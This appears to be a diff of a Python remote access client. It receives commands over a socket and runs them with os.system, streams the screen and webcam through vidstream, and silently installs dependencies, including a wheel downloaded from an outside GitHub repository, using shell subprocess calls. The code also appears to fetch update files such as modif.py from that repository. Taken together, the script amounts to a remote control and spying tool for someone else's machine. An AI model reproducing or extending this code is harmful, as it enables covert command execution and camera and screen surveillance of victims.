@@ -1,19 +1,17 @@
 import socket
-import requests, zipfile, os, shutil
+import zipfile, os, shutil, time, subprocess
 from turtle import left
-import pyautogui
-from vidstream import ScreenShareClient
-from vidstream import CameraClient
-url = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip"
-
-#fichier modifier
-def receive():
-        data = client.recv(1024)
-        return data.decode()
+try:
+    import pyautogui
+except:
+    subprocess.Popen("py -m pip install pyautogui", shell=True)
+    time.sleep(100)
+try:
+    import requests
+except:
+    subprocess.Popen("py -m pip install requests", shell=True)
+    time.sleep(100)
     
-def terminal(command):
-    os.system(command)
-
 def getpath(change=False):
     if change in (False, "not", "\\"):
         return os.getcwd()
@@ -44,12 +42,37 @@ def sortNameFile(data):
     from os.path import isfile, join
     return [f for f in os.listdir(data) if isfile(join(data, f))]
     
-def moveFileFromDir(data):
+def moveFileFromDir(data, file="modif.py"):
     fichiers = []
-    fichiers.append("modif.py")
+    fichiers.append(file)
     for f in range(len(fichiers)):
         if fichiers[f] != getFileName():
             shutil.copy(getpath(True)+"/"+data+"/"+fichiers[f], getpath(True))
+
+try:
+    from vidstream import ScreenShareClient
+    from vidstream import CameraClient
+except:
+    dir = "wlh-main"
+    downloadFileGithub("https://github.com/N0SAFE/whl/archive/refs/heads/main.zip")
+    moveFileFromDir(dir, "PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
+    supDir(dir)
+    subprocess.Popen("py -m pip install PyAudio-0.2.11-cp39-cp39-win_amd64.whl", shell=True)
+    time.sleep(60)
+    subprocess.Popen("py -m pip install vidstream", shell=True)
+    time.sleep(100)
+    os.remove("PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
+
+
+url = "https://github.com/N0SAFE/kit/archive/refs/heads/main.zip"
+
+#fichier modifier
+def receive():
+        data = client.recv(1024)
+        return data.decode()
+    
+def terminal(command):
+    os.system(command)
 
     
 def cdAccess(cd):
